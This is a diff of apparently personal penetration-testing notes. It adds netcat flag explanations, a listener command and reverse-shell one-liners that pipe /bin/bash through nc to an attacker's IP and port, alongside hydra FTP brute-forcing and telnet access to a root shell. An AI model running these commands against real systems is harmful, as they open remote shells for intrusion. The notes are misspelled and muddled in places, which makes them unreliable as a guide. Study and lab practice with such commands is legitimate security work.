@@ -22,9 +22,24 @@ command binding> -sV + -sC = -sVC
 ]
  >reverse shell
 
- 
-nc -lvnp <port 9001>
-python <script> <ip> nc <own ip> <port> -e /bin/bash
+nc=netcat
+l=lison
+v=verbose       _ _ _ _ _
+n=continue     |         |
+p=port         |         | 
+                         |
+                   ______|______
+                   |           |
+                     nc -lvnp <port 9001>
+                    python <script> <ip> nc <own ip> <port> -e /bin/bash
+
+
+
+
+reverse shell cheatsheet
+
+
+
 
 
 >hydra
@@ -44,5 +59,26 @@ hydera -L user.txt -P pass.txt ftp://<ip:port>
 telnet <ip> <port of root shell >
 
 
->metesploit
+>shell access steps
+
+
+step 1
+------
+  opening port
+nc -lvnp port
+
+step 2
+------
+target system
+
+nc <ip:port of target> -e /bin/bash
+
+step3
+-----
+
+hacktool extenction for good command exe (TTY Spawn Shell)
+
+
+
+
 
